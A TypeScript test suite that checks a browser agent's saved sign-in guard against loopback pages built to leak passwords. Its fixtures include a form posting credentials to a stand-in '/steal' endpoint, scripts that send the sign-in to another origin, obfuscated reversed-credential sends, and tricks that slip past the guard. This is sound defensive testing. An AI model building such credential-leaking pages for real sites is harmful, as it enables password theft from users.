/**
 * What a saved sign-in refuses to do in a real browser: put the password in a page address,
 * send it to another site, type the username into a box that is not a sign-in, or leave the
 * password typed in a field when the step ends early. Real Chromium, loopback sites.
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { chromiumAvailable, chromiumMissingReason } from '../../src/workers/browser/available.ts';
import { type BrowserWorkerClient, BrowserWorkerPool } from '../../src/workers/browser/client.ts';
import type { BrowserCommandResult } from '../../src/workers/browser/controller.ts';
import { BrowserFault, type BrowserSession } from '../../src/workers/browser/sessions.ts';

const USERNAME = 'jo.rivera@example.com';
const PASSWORD = 'Planted-pässword-7f3a91';
/** A password with a `+` and characters an address escapes, as a script joins it into one. */
const PLUS_PASSWORD = "Tom's+pw1<x>";
/** Every way the password can be written into an address or a body. */
const PASSWORD_FORMS = [
  PASSWORD,
  encodeURIComponent(PASSWORD),
  new URLSearchParams([['', PASSWORD]]).toString().slice(1),
];

type Seen = { site: 'site' | 'away'; method: string; path: string; search: string; body: string };

const USER_FIELD =
  '<label for="u">Email</label><input id="u" name="email" type="email" autocomplete="username">';
const PASSWORD_FIELD =
  '<label for="p">Password</label><input id="p" name="password" type="password" autocomplete="current-password">';
/** Says the longest the password field ever held, so a test can tell whether it was typed into. */
const TYPED = `<p id="typed">Typed 0</p><script>
    let most = 0;
    document.getElementById('p').addEventListener('input', (event) => {
      most = Math.max(most, event.target.value.length);
      document.getElementById('typed').textContent = 'Typed ' + most;
    });
  </script>`;
/** A sign-in page whose script sends `count` writes of its own before the sign-in, as a busy page does. */
const BUSY = (
  count: number,
  send: string,
) => `<form action="">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
  <p id="said"></p>
  <script>
    document.querySelector('form').addEventListener('submit', async (event) => {
      event.preventDefault();
      const u = document.getElementById('u').value;
      const p = document.getElementById('p').value;
      for (let n = 0; n < ${count}; n++)
        await fetch('/busy/telemetry', { method: 'POST', body: '{}' }).catch(() => {});
      try {
        const answer = await ${send};
        if (answer.ok) location.href = '/account';
        else document.getElementById('said').textContent = 'That password isn’t right.';
      } catch {
        document.getElementById('said').textContent = 'That password isn’t right.';
      }
    });
  </script>`;
/** Shows how long a field's value is, so a test can tell whether something is typed in it. */
const REPORT = (field: string) =>
  `<p id="said"></p><button type="button" id="report">Report</button><script>
    document.getElementById('report').addEventListener('click', () => {
      document.getElementById('said').textContent =
        'Length ' + document.getElementById('${field}').value.length;
    });
  </script>`;

function html(title: string, body: string) {
  return new Response(
    `<!doctype html><html lang="en"><head><meta charset="UTF-8"><title>${title}</title></head><body style="margin:24px;font:16px sans-serif"><h1>${title}</h1>${body}</body></html>`,
    { headers: { 'content-type': 'text/html; charset=utf-8' } },
  );
}
const go = (to: string, cookie?: string) =>
  new Response(null, {
    status: 302,
    headers: { location: to, ...(cookie ? { 'set-cookie': `${cookie}; Path=/` } : {}) },
  });

function startSites() {
  const seen: Seen[] = [];
  const note = async (site: Seen['site'], request: Request) => {
    const url = new URL(request.url);
    const body = ['GET', 'HEAD'].includes(request.method) ? '' : await request.text();
    seen.push({ site, method: request.method, path: url.pathname, search: url.search, body });
    return { url, fields: new URLSearchParams(body) };
  };
  const away = Bun.serve({
    hostname: '127.0.0.2',
    port: 0,
    async fetch(request) {
      await note('away', request);
      return new Response('{}', {
        headers: { 'content-type': 'application/json', 'access-control-allow-origin': '*' },
      });
    },
  });
  const elsewhere = away.url.origin;
  const site = Bun.serve({
    hostname: '127.0.0.1',
    port: 0,
    async fetch(request) {
      const { url, fields } = await note('site', request);
      const post = request.method === 'POST';
      const query = url.searchParams;
      switch (url.pathname) {
        case '/get-login':
          // A form with no method: the browser would send what it holds in the address.
          if (query.get('password') === PASSWORD) return html('Your account', '<p>Welcome.</p>');
          return html(
            'Sign in',
            `<form action="/get-login">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>`,
          );
        case '/get-explicit':
          if (query.get('password') === PASSWORD) return html('Your account', '<p>Welcome.</p>');
          return html(
            'Sign in',
            `<form method="get" action="/get-explicit">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>${REPORT('p')}`,
          );
        case '/get-bypass':
          // A page whose script keeps the submit from reaching the window, so only the network
          // guard stands between the password and the address.
          if (query.get('password') === PASSWORD) return html('Your account', '<p>Welcome.</p>');
          return html(
            'Sign in',
            `<form action="/get-bypass">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            <script>
              document.querySelector('form').addEventListener('submit', (event) => event.stopPropagation());
            </script>`,
          );
        case '/hash-login':
          // A page whose script writes what was typed into the address's fragment, which no
          // request carries.
          return html(
            'Sign in',
            `<form method="post" action="/hash-login">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            <script>
              document.querySelector('form').addEventListener('submit', (event) => {
                event.preventDefault();
                location.hash = 'p=' + encodeURIComponent(document.getElementById('p').value);
              });
            </script>`,
          );
        case '/get-away':
          return html(
            'Sign in',
            `<form method="get" action="${elsewhere}/steal">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>${REPORT('p')}`,
          );
        case '/spa-get':
          // A form with no method that the page's script sends itself, as most single-page
          // sites do once their script has run.
          return html(
            'Sign in',
            `<form action="">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            <script>
              document.querySelector('form').addEventListener('submit', async (event) => {
                event.preventDefault();
                const body = new URLSearchParams(new FormData(event.target));
                const answer = await fetch('/spa-get/session', { method: 'POST', body });
                if (answer.ok) location.href = '/account';
              });
            </script>`,
          );
        case '/spa-get/session':
          if (post && fields.get('password') === PASSWORD)
            return new Response('{}', {
              headers: { 'content-type': 'application/json', 'set-cookie': 'sid=1; Path=/' },
            });
          return new Response('{}', { status: 401 });
        case '/spa-away':
          // A page whose script sends the sign-in to another site's address.
          return html(
            'Sign in',
            `<form action="">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            ${REPORT('p')}
            <script>
              document.querySelector('form').addEventListener('submit', async (event) => {
                event.preventDefault();
                const body = new URLSearchParams(new FormData(event.target));
                try {
                  const answer = await fetch('${elsewhere}/api/session', { method: 'POST', body });
                  if (answer.ok) location.href = '/account';
                } catch {
                  document.getElementById('said').textContent = 'That password isn’t right.';
                }
              });
            </script>`,
          );
        case '/captcha-after':
          // A page that answers the sign-in in place with a person check, keeping the password.
          return html(
            'Sign in',
            `<form method="post" action="/captcha-after">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            ${REPORT('p')}<div id="check"></div>
            <script>
              document.querySelector('form').addEventListener('submit', (event) => {
                event.preventDefault();
                const check = document.getElementById('check');
                check.className = 'g-recaptcha';
                check.style.cssText = 'width:304px;height:78px;background:#ddd';
              });
            </script>`,
          );
        case '/newsletter':
          // No sign-in here: a page with a newsletter box in its footer.
          return html(
            'Welcome',
            `<p>Our shop.</p><footer><form method="post" action="/subscribe">
              <input id="n" type="email" name="email" placeholder="Your email address">
              <button type="submit">Subscribe</button></form></footer>${REPORT('n')}`,
          );
        case '/forgot':
          return html(
            'Forgot your password?',
            `<form method="post" action="/forgot-password">
              <label for="f">Email</label><input id="f" name="email" type="email" autocomplete="username">
              <button type="submit">Send reset link</button></form>${REPORT('f')}`,
          );
        case '/id-first':
          // A username-first sign-in that names no autocomplete, only what it is for.
          if (post && fields.get('email') === USERNAME) return go('/id-first/password');
          return html(
            'Sign in',
            `<form method="post" action="/id-first" id="sign-in-form">
              <label for="u">Email or phone</label><input id="u" name="email" type="email">
              <button type="submit">Next</button></form>`,
          );
        case '/id-first/password':
          if (post && fields.get('password') === PASSWORD) return go('/account', 'sid=signed-in');
          return html(
            'Enter your password',
            `<form method="post" action="/id-first/password">${PASSWORD_FIELD}<button type="submit">Sign in</button></form>`,
          );
        case '/again':
          // A username-first sign-in that asks for the username again instead of a password.
          return html(
            'Sign in',
            `${post ? '<p role="alert">We couldn’t find that account.</p>' : ''}<form method="post" action="/again">${USER_FIELD}<button type="submit">Next</button></form>`,
          );
        case '/naive-plus':
          // A page whose script joins what was typed into an address, unescaped.
          return html(
            'Sign in',
            `<form action="">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            <script>
              document.querySelector('form').addEventListener('submit', (event) => {
                event.preventDefault();
                location.href = '/naive-plus/go?user=' + document.getElementById('u').value +
                  '&pass=' + document.getElementById('p').value;
              });
            </script>`,
          );
        case '/later-address':
          // A page whose script writes the password into its address after the step is over,
          // with no request.
          return html(
            'Sign in',
            `<form action="">${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>
            <p id="said"></p>
            <script>
              document.querySelector('form').addEventListener('submit', (event) => {
                event.preventDefault();
                const p = document.getElementById('p').value;
                document.getElementById('said').textContent = 'Checking…';
                setTimeout(() => history.replaceState(null, '', '?p=' + encodeURIComponent(p)), 2500);
              });
            </script>`,
          );
        case '/action-field':
          // A form that posts to another site, with a field named "action", as many sign-in
          // pages have: the field stands in for the form's own address on the form.
          return html(
            'Sign in',
            `<form method="post" action="${elsewhere}/collect">
              <input type="hidden" name="action" value="login">
              ${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>${TYPED}`,
          );
        case '/method-field':
          // A sign-in form with a field named "method".
          if (post && fields.get('password') === PASSWORD) return go('/account', 'sid=method');
          return html(
            'Sign in',
            `<form method="post" action="/method-field">
              <input type="hidden" name="method" value="password">
              ${USER_FIELD}${PASSWORD_FIELD}<button type="submit">Sign in</button></form>`,
          );
        case '/busy':
          return html(
            'Sign in',
            BUSY(
              16,
              "fetch('/busy/session', { method: 'POST', body: new URLSearchParams({ email: u, password: p }) })",
            ),
          );
        case '/busy-hidden':
          // The sign-in written so no check can tell it is one: reversed, to a plain address.
          return html(
            'Sign in',
            BUSY(
              16,
              "fetch('/busy/x', { method: 'POST', body: [...u].reverse().join('') + '|' + [...p].reverse().join('') })",
            ),
          );
        case '/busy/telemetry':
          return new Response('{}', { headers: { 'content-type': 'application/json' } });
        case '/busy/session':
          if (post && fields.get('password') === PASSWORD)
            return new Response('{}', {
              headers: { 'content-type': 'application/json', 'set-cookie': 'sid=busy; Path=/' },
            });
          return new Response('{}', { status: 401 });
        case '/account':
          return html('Your account', '<p>Welcome back.</p>');
        default:
          return new Response('not found', { status: 404 });
      }
    },
  });
  return {
    site: site.url.origin,
    away: elsewhere,
    seen,
    close: async () => {
      site.stop(true);
      away.stop(true);
    },
  };
}

if (!chromiumAvailable) test.todo(chromiumMissingReason, () => {});
(chromiumAvailable ? describe : describe.skip)('what a saved sign-in refuses to do', () => {
  let sites: ReturnType<typeof startSites>;
  let pool: BrowserWorkerPool;
  let worker: BrowserWorkerClient;
  let session: BrowserSession;
  let root = '';
  const JOB = 'job_sign_in_guard';

  beforeAll(async () => {
    sites = startSites();
    root = await mkdtemp(join(tmpdir(), 'melete-browser-sign-in-guard-'));
    pool = new BrowserWorkerPool({
      spacesRoot: root,
      allowLocalProcess: true,
      workerEntry: new URL('../helpers/browser-child.ts', import.meta.url),
      workerArguments: [sites.site, sites.away],
    });
    worker = await pool.get('sp_sign_in_guard');
    session = await worker.lease(JOB, {
      public_compartment: false,
      allowed_domains: ['127.0.0.1', '127.0.0.2'],
    });
    await call({ kind: 'observe' });
  }, 60_000);

  afterAll(async () => {
    await pool?.close();
    await sites?.close();
    if (root) await rm(root, { recursive: true, force: true }).catch(() => {});
  }, 30_000);

  const call = (operation: unknown) =>
    worker.request<BrowserCommandResult>('/command', {
      session_id: session.id,
      job_id: JOB,
      control_epoch: session.control_epoch,
      operation,
    });
  const signIn = (path: string, password = PASSWORD) =>
    call({
      kind: 'sign_in',
      origin: sites.site,
      url: `${sites.site}${path}`,
      username: USERNAME,
      password,
    });
  const outcome = (result: BrowserCommandResult) =>
    (result.result as { sign_in?: string } | undefined)?.sign_in;
  /** What the page's Report button says about its field. */
  const report = async () => {
    await call({ kind: 'observe' });
    await call({ kind: 'click', role: 'button', name: 'Report' });
    return ((await call({ kind: 'read', selector: '#said' })).result as { text?: string }).text;
  };
  /** The password went nowhere: not in any address or body a site got, not in what was said. */
  const nowhere = (since: number, ...said: unknown[]) => {
    for (const entry of sites.seen.slice(since))
      for (const form of PASSWORD_FORMS) {
        expect([form, (entry.path + entry.search).includes(form)]).toEqual([form, false]);
        if (entry.site === 'away') expect([form, entry.body.includes(form)]).toEqual([form, false]);
      }
    const text = JSON.stringify(said);
    for (const form of PASSWORD_FORMS) expect([form, text.includes(form)]).toEqual([form, false]);
  };

  for (const path of ['/get-login', '/get-explicit']) {
    test(`a form that would put the password in the address (${path}) is not sent that way`, async () => {
      const before = sites.seen.length;
      const result = await signIn(path);
      expect(outcome(result)).toBe('unsafe_form');
      const looked = await call({ kind: 'observe' });
      nowhere(before, result, looked);
      expect(looked.observation?.url.startsWith(`${sites.site}${path}`)).toBe(true);
    }, 60_000);
  }

  test('a page that keeps the guard from seeing its submit still never sends the password in the address', async () => {
    const before = sites.seen.length;
    const result = await signIn('/get-bypass');
    expect(outcome(result)).toBe('unsafe_form');
    const looked = await call({ kind: 'observe' });
    nowhere(before, result, looked);
  }, 60_000);

  test('an address that came to hold the password, with no request, is never shown', async () => {
    const before = sites.seen.length;
    const result = await signIn('/hash-login');
    const looked = await call({ kind: 'observe' });
    nowhere(before, result, looked);
    expect(looked.observation?.url).not.toContain('#p=');
  }, 60_000);

  test('a form that would send the password to another site in its address is never typed into', async () => {
    const before = sites.seen.length;
    const result = await signIn('/get-away');
    expect(outcome(result)).toBe('wrong_site');
    expect(sites.seen.slice(before).filter((entry) => entry.site === 'away')).toEqual([]);
    const looked = await call({ kind: 'observe' });
    nowhere(before, result, looked);
    expect(await report()).toBe('Length 0');
  }, 60_000);

  test('a page whose script sends the sign-in itself still signs in', async () => {
    const before = sites.seen.length;
    const result = await signIn('/spa-get');
    expect(outcome(result)).toBe('signed_in');
    expect(
      sites.seen.slice(before).filter((e) => e.method === 'POST' && e.path === '/spa-get/session'),
    ).toHaveLength(1);
    nowhere(before, result, await call({ kind: 'observe' }));
  }, 60_000);

  test('a script that sends the password to another site ends the step as sent elsewhere', async () => {
    const before = sites.seen.length;
    const result = await signIn('/spa-away');
    expect(outcome(result)).toBe('wrong_site');
    expect(sites.seen.slice(before).filter((entry) => entry.site === 'away')).toEqual([]);
    nowhere(before, result);
    expect(await report()).toBe('Length 0');
  }, 60_000);

  test('a person check that shows after the password was typed leaves the field empty', async () => {
    const result = await signIn('/captcha-after');
    expect(outcome(result)).toBe('captcha');
    expect(await report()).toBe('Length 0');
  }, 60_000);

  test('a newsletter box is never taken for a username', async () => {
    await call({ kind: 'open', url: `${sites.site}/newsletter` });
    const before = sites.seen.length;
    expect(outcome(await signIn('/newsletter'))).toBe('form_not_found');
    expect(sites.seen.slice(before).filter((entry) => entry.method === 'POST')).toEqual([]);
    expect(await report()).toBe('Length 0');
  }, 60_000);

  test('a forgot-password form is never taken for a username', async () => {
    const before = sites.seen.length;
    expect(outcome(await signIn('/forgot'))).toBe('form_not_found');
    expect(sites.seen.slice(before).filter((entry) => entry.method === 'POST')).toEqual([]);
    expect(await report()).toBe('Length 0');
  }, 60_000);

  test('a sign-in that asks for the username first, and says so, still signs in', async () => {
    const before = sites.seen.length;
    expect(outcome(await signIn('/id-first'))).toBe('signed_in');
    const posts = sites.seen.slice(before).filter((entry) => entry.method === 'POST');
    expect(posts.map((entry) => entry.path)).toEqual(['/id-first', '/id-first/password']);
  }, 60_000);

  test('a username asked for again is sent once, and the answer says it was sent', async () => {
    const before = sites.seen.length;
    const result = await signIn('/again');
    expect(outcome(result)).toBe('username_sent');
    const posts = sites.seen.slice(before).filter((entry) => entry.method === 'POST');
    expect(posts.map((entry) => entry.path)).toEqual(['/again']);
  }, 60_000);

  test('a password a script joins into an address unescaped, with a plus in it, is never sent', async () => {
    const before = sites.seen.length;
    const result = await signIn('/naive-plus', PLUS_PASSWORD);
    expect(outcome(result)).toBe('unsafe_form');
    expect(sites.seen.slice(before).filter((entry) => entry.path === '/naive-plus/go')).toEqual([]);
    const looked = await call({ kind: 'observe' });
    for (const form of [PLUS_PASSWORD, encodeURIComponent(PLUS_PASSWORD), 'Tom%27s+pw1'])
      expect([form, JSON.stringify([result, looked]).includes(form)]).toEqual([form, false]);
  }, 60_000);

  test('an address a script gives the password after the step is never shown by a look', async () => {
    const before = sites.seen.length;
    const result = await signIn('/later-address');
    // The page's script writes the address once the step is over.
    await new Promise((resolve) => setTimeout(resolve, 3_500));
    const looked = await call({ kind: 'observe' });
    nowhere(before, result, looked);
    expect(looked.observation?.url).toBe(`${sites.site}/later-address`);
  }, 60_000);

  test('a form with a field named "action" that posts to another site is never typed into', async () => {
    const before = sites.seen.length;
    const result = await signIn('/action-field');
    expect(outcome(result)).toBe('wrong_site');
    expect(sites.seen.slice(before).filter((entry) => entry.site === 'away')).toEqual([]);
    await call({ kind: 'observe' });
    const typed = ((await call({ kind: 'read', selector: '#typed' })).result as { text?: string })
      .text;
    expect(typed).toBe('Typed 0');
    nowhere(before, result);
  }, 60_000);

  test('a form with a field named "method" still signs in', async () => {
    const before = sites.seen.length;
    expect(outcome(await signIn('/method-field'))).toBe('signed_in');
    const posts = sites.seen.slice(before).filter((entry) => entry.method === 'POST');
    expect(posts.map((entry) => entry.path)).toEqual(['/method-field']);
  }, 60_000);

  test("a busy page's sign-in, sent after its own budget of writes, still goes and signs in", async () => {
    const before = sites.seen.length;
    expect(outcome(await signIn('/busy'))).toBe('signed_in');
    const posts = sites.seen.slice(before).filter((entry) => entry.method === 'POST');
    expect(posts.filter((entry) => entry.path === '/busy/session')).toHaveLength(1);
  }, 60_000);

  test('a sign-in held back for the budget is never reported as a wrong password', async () => {
    const before = sites.seen.length;
    const failure = await signIn('/busy-hidden').then(
      (result) => outcome(result),
      (error: unknown) => (error instanceof BrowserFault ? error.reason : String(error)),
    );
    expect(failure).toBe('sign_in_budget');
    expect(sites.seen.slice(before).filter((entry) => entry.path === '/busy/x')).toEqual([]);
  }, 60_000);
});
